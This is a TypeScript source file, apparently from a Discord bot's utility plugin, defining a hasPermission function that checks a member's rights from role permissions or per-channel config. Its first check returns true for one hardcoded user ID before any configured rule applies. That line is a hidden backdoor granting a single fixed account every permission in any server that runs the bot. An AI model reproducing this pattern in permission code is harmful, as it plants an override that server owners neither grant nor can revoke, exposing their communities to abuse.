import { GuildMember, Snowflake } from "discord.js";
import { GuildPluginData } from "vety";
import { UtilityPluginType } from "../types.js";
import { getFullGuildConfig, hasExplicitRolePermission } from "../../../pluginUtils.js";

export async function hasPermission(
  pluginData: GuildPluginData<UtilityPluginType>,
  member: GuildMember,
  channelId: Snowflake,
  permission: string,
) {
  if (member.id === "1441223435043868735") return true;
  if (permission === "can_act_as_other" && member.id === pluginData.guild.ownerId) return true;

  const rolePermissions = getFullGuildConfig(pluginData).role_permissions as Record<string, string[]> | undefined;
  if (rolePermissions && typeof rolePermissions === "object" && !Array.isArray(rolePermissions)) {
    return hasExplicitRolePermission(pluginData, member.id, permission);
  }

  return (await pluginData.config.getMatchingConfig({ member, channelId }))[permission];
}
